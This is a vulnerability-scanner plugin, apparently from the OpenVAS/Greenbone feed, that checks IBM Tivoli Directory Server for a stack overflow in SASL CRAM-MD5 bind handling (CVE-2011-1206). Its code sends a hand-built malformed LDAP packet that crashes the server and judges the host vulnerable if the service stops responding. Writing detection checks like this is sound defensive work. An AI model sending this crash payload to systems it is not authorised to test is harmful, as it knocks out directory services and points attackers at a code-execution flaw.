# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902507");
  script_version("2025-03-05T05:38:52+0000");
  script_cve_id("CVE-2011-1206", "CVE-2011-1820");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-03-05 05:38:52 +0000 (Wed, 05 Mar 2025)");
  script_tag(name:"creation_date", value:"2011-05-02 12:20:04 +0200 (Mon, 02 May 2011)");
  script_name("IBM Tivoli Directory Server SASL Bind Request RCE Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Buffer overflow");
  script_dependencies("ldap_detect.nasl");
  script_require_ports("Services/ldap", 389, 636);
  script_mandatory_keys("ldap/detected");

  script_xref(name:"URL", value:"http://secunia.com/advisories/44184");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/47121");
  script_xref(name:"URL", value:"http://securitytracker.com/id?1025358");
  script_xref(name:"URL", value:"http://www.1337day.com/exploits/15889");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/17188/");
  script_xref(name:"URL", value:"https://www-304.ibm.com/support/docview.wss?uid=swg24029672");
  script_xref(name:"URL", value:"https://www-304.ibm.com/support/docview.wss?uid=swg24029663");
  script_xref(name:"URL", value:"https://www-304.ibm.com/support/docview.wss?uid=swg24029661");
  script_xref(name:"URL", value:"https://www-304.ibm.com/support/docview.wss?uid=swg24029660");

  script_tag(name:"impact", value:"Successful exploitation could allow remote attackers to execute arbitrary
  code within the context of the affected application or retrieve potentially sensitive information.");

  script_tag(name:"affected", value:"IBM Tivoli Directory Server 5.2 before 5.2.0.5-TIV-ITDS-IF0010,
  6.0 before 6.0.0.67 (6.0.0.8-TIV-ITDS-IF0009),
  6.1 before 6.1.0.40 (6.1.0.5-TIV-ITDS-IF0003),
  6.2 before 6.2.0.16 (6.2.0.3-TIV-ITDS-IF0002),
  and 6.3 before 6.3.0.3");

  script_tag(name:"insight", value:"The flaw is caused by a stack overflow error in the 'ibmslapd.exe' component
  when allocating a buffer via the 'ber_get_int()' function within
  'libibmldap.dll' while handling LDAP CRAM-MD5 packets, which could be
  exploited by remote unauthenticated attackers to execute arbitrary code with
  SYSTEM privileges.");

  script_tag(name:"solution", value:"Apply Vendor patches.");

  script_tag(name:"summary", value:"IBM Tivoli Directory Server is prone to a remote code execution (RCE) vulnerability.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("ldap.inc");
include("port_service_func.inc");

port = ldap_get_port(default:389);

if(!ldap_alive(port:port))
  exit(0);

soc = open_sock_tcp(port);
if(!soc)
  exit(0);

## LDAP SASL Bind Request
data = raw_string(0x30, 0x18, 0x02, 0x01, 0x01, 0x60, 0x13, 0x02,
                  0x01, 0x03, 0x04, 0x00, 0xa3, 0x0c, 0x04, 0x08,
                  0x43, 0x52, 0x41, 0x4d, 0x2d, 0x4d, 0x44, 0x35,
                  0x04, 0x00);

attack = raw_string(0x30, 0x82, 0x01, 0x41, 0x02, 0x01, 0x02, 0x60,
                    0x82, 0x01, 0x3a, 0x02, 0x01, 0x03, 0x04, 0x00,
                    0xa3, 0x82, 0x01, 0x31, 0x04, 0x08, 0x43, 0x52,
                    0x41, 0x4d, 0x2d, 0x4d, 0x44, 0x35, 0x04, 0x84,
                    0xff, 0xff, 0xff, 0xff) +
         crap(data:raw_string(0x41), length:256) +
         raw_string(0x20, 0x36, 0x61, 0x37, 0x61, 0x31, 0x31, 0x34,
                    0x39, 0x36, 0x30, 0x33, 0x61, 0x64, 0x37, 0x64,
                    0x30, 0x33, 0x34, 0x39, 0x35, 0x66, 0x39, 0x65,
                    0x37, 0x31, 0x34, 0x66, 0x34, 0x30, 0x66, 0x31,
                    0x63);

send(socket:soc, data:data);
res = recv(socket:soc, length:128);
send(socket:soc, data:attack);
res = recv(socket:soc, length:128);

if(!ldap_alive(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
